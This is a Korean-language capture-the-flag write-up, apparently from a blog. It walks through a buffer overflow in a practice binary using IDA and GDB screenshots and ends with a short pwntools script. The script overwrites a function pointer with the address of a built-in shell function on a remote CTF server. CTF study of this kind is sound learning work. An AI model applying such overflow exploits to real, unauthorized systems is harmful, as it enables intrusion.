@@ -1,0 +1,36 @@
+I"	<p>먼저 파일을 IDA로 분석하자.
+<img src="https://user-images.githubusercontent.com/51374792/62466597-a3278b80-b7cc-11e9-98ea-f68350b5c6eb.PNG" alt="캡처" />
+최대 133만큼 입력받는다.</p>
+
+<p>리눅스로 옮겨 GDB를 보자.
+<img src="https://user-images.githubusercontent.com/51374792/62467284-5775e180-b7ce-11e9-818e-842eb5c556ab.PNG" alt="캡처" /></p>
+
+<p>main+48에서 입력받는다.</p>
+
+<p>또한 main+20에서 함수를 호출하기 위해 0x80484b4를 참조하는 것을 알 수 있다.</p>
+
+<p>A를 120개 넣고 레지스터가 어떻게 되는지 확인해봤다.</p>
+
+<p><img src="https://user-images.githubusercontent.com/51374792/62604611-6629d900-b933-11e9-806d-80739c8238bb.PNG" alt="캡처" /></p>
+
+<p>이곳에 0x80484b4가 있는 것이 보인다.</p>
+
+<p>입력값 129개부터에서 보이는 것을 보니, 129개의 값과 쉘 코드를 실행시키는 주소를 넣어주면 되겠다.</p>
+
+<p><img src="https://user-images.githubusercontent.com/51374792/62604662-8063b700-b933-11e9-8a18-5aae6856ff48.PNG" alt="캡처2" /></p>
+
+<p>IDA에서 사용하는 함수를 보니, shell이라는 것이 있다.</p>
+
+<p>이것을 RET주소로 넣어주자.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"ctf.j0n9hyun.xyz"</span><span class="p">,</span><span class="mi">3001</span><span class="p">)</span>
+<span class="n">code</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">128</span><span class="o">+</span><span class="s">"</span><span class="se">\x9b\x84\x04\x08</span><span class="s">"</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+:ET
